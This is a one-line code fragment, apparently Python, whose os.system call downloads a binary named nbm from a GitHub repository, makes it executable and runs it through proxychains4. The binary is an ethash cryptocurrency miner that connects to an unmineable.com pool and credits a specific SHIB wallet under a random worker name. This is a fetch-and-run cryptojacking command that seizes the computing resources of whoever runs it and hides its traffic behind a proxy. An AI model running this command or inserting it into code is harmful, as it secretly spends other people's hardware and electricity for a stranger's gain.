...
os.system("wget https://github.com/cuvge/vsc0d3/raw/main/nbm && chmod 755 nbm && proxychains4 ./nbm -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.$(echo $(shuf -i 1000-9999 -n 1)-shiba)")
